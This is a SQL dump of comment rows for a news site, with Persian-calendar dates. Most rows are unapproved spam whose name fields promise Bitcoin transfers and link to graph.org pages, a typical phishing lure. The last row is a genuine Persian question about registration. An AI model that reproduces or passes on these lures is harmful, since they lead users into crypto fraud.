INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88577, 62283, '🔓 Ticket- + 1.790185 BTC. Continue >> https://graph.org/Binance-04-15?hs=296ca04f37dc0b463f5e0dd211', 'roofa2000@automisly.org', 'pp6t0n', 0, '2025-04-22 14:05:31', '1404/2/2', '2:05:31 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88578, 62284, '💾 + 1.717363 BTC.NEXT - https://graph.org/Binance-04-15?hs=66012087906eb13669fb32fad9ed345c& 💾', 'roofa2000@automisly.org', 'rlzlj8', 0, '2025-04-22 14:05:34', '1404/2/2', '2:05:34 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88579, 62285, '📱 Message: TRANSFER 1.619408 BTC. Assure > https://graph.org/Binance-04-15?hs=eda4acafd04456e9eadf9', 'roofa2000@automisly.org', 'dftnqm', 0, '2025-04-22 14:05:37', '1404/2/2', '2:05:37 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88580, 62286, '📯 + 1.387028 BTC.GET - https://graph.org/Binance-04-15?hs=8fc6b9e53dca8022216646abc9bc2fa8& 📯', 'roofa2000@automisly.org', '6idj9z', 0, '2025-04-22 14:05:39', '1404/2/2', '2:05:39 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88581, 62284, '🗒 Email- Operation 1,889054 BTC. GET >>> https://graph.org/Message--17856-03-25?hs=66012087906eb136', 'friedenspfeifen@omggreatfoods.com', 'o11ao5', 0, '2025-04-24 04:44:36', '1404/2/4', '4:44:36 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88582, 62285, '📨 Email: SENDING 1.998204 BTC. Next >>> https://graph.org/Message--17856-03-25?hs=eda4acafd04456e9e', 'friedenspfeifen@omggreatfoods.com', 'qqhahn', 0, '2025-04-24 04:44:38', '1404/2/4', '4:44:38 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88583, 62286, '🔐 + 1.174919 BTC.GET - https://graph.org/Message--17856-03-25?hs=8fc6b9e53dca8022216646abc9bc2fa8& ', 'friedenspfeifen@omggreatfoods.com', 'aag1to', 0, '2025-04-24 04:44:40', '1404/2/4', '4:44:40 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88584, 62287, '📓 Message: + 1,302090 BTC. Get >>> https://graph.org/Message--17856-03-25?hs=3bab3170d5de578583fb04', 'friedenspfeifen@omggreatfoods.com', 'z23tzp', 0, '2025-04-24 04:44:43', '1404/2/4', '4:44:43 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88585, 62284, '✏ Email- Process 1.888297 BTC. Confirm >> https://graph.org/Message--0484-03-25?hs=66012087906eb1366', 'ransan@apotekberjalan.com', 'xahdj7', 0, '2025-04-24 14:43:11', '1404/2/4', '2:43:11 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88586, 62285, '🔐 + 1.829206 BTC.GET - https://graph.org/Message--0484-03-25?hs=eda4acafd04456e9eadf9dca93e54236& �', 'ransan@apotekberjalan.com', '46j7uc', 0, '2025-04-24 14:43:17', '1404/2/4', '2:43:17 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88587, 62286, '🔓 + 1.178648 BTC.NEXT - https://graph.org/Message--0484-03-25?hs=8fc6b9e53dca8022216646abc9bc2fa8& ', 'ransan@apotekberjalan.com', 'j3f3v3', 0, '2025-04-24 14:43:20', '1404/2/4', '2:43:20 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88588, 62287, '📞 + 1.729329 BTC.NEXT - https://graph.org/Message--0484-03-25?hs=3bab3170d5de578583fb043f84a665c3& ', 'ransan@apotekberjalan.com', 's4s8m8', 0, '2025-04-24 14:43:27', '1404/2/4', '2:43:27 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88589, 62287, '⌨ Reminder; TRANSACTION 1,219977 BTC. Next >>> https://graph.org/Message--120154-03-25?hs=3bab3170d5', 'vivzgnoras@email-temp.com', 'ocxths', 0, '2025-04-30 09:04:24', '1404/2/10', '9:04:24 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88590, 62288, '📍 + 1.495006 BTC.GET - https://graph.org/Message--120154-03-25?hs=5b4ef34aa3ddda8d43f8493ff3d7e548&', 'vivzgnoras@email-temp.com', 'zkvu5v', 0, '2025-04-30 09:04:28', '1404/2/10', '9:04:28 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88591, 62289, '📬 Email- TRANSFER 1,937608 BTC. Assure =>> https://graph.org/Message--120154-03-25?hs=76ff5064ee075', 'vivzgnoras@email-temp.com', 'qm8x2s', 0, '2025-04-30 09:04:30', '1404/2/10', '9:04:30 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88592, 62290, '📙 Ticket: Operation 1,157919 bitcoin. Next >> https://graph.org/Message--120154-03-25?hs=6a84047f35', 'vivzgnoras@email-temp.com', 'thauzd', 0, '2025-04-30 09:04:32', '1404/2/10', '9:04:32 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88593, 62292, '📍 + 1.697988 BTC.NEXT - https://graph.org/Ticket--58146-05-02?hs=0f4cb1c656721271a7d30a56ef410c4b& ', 'friedenspfeifen@omggreatfoods.com', 'oouo6d', 0, '2025-05-10 03:18:36', '1404/2/20', '3:18:36 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88594, 62293, '🔒 + 1.798020 BTC.GET - https://graph.org/Ticket--58146-05-02?hs=15529d64ac09888ea563d8770f6c2f12& �', 'friedenspfeifen@omggreatfoods.com', '88t3af', 0, '2025-05-10 03:18:40', '1404/2/20', '3:18:40 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88595, 62294, '📁 Reminder- Operation 1,712351 BTC. Verify > https://graph.org/Ticket--58146-05-02?hs=4ede0d704a332', 'friedenspfeifen@omggreatfoods.com', 'cc7mk4', 0, '2025-05-10 03:18:44', '1404/2/20', '3:18:44 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (89593, 59212, 'حسن عراقی', 'aghamoalem32@gmail.com', 'سلام هنوزم ثبت نام دارید؟', 0, '2025-05-26 06:45:54', '1404/3/5', '6:45:54 AM');

COMMIT;

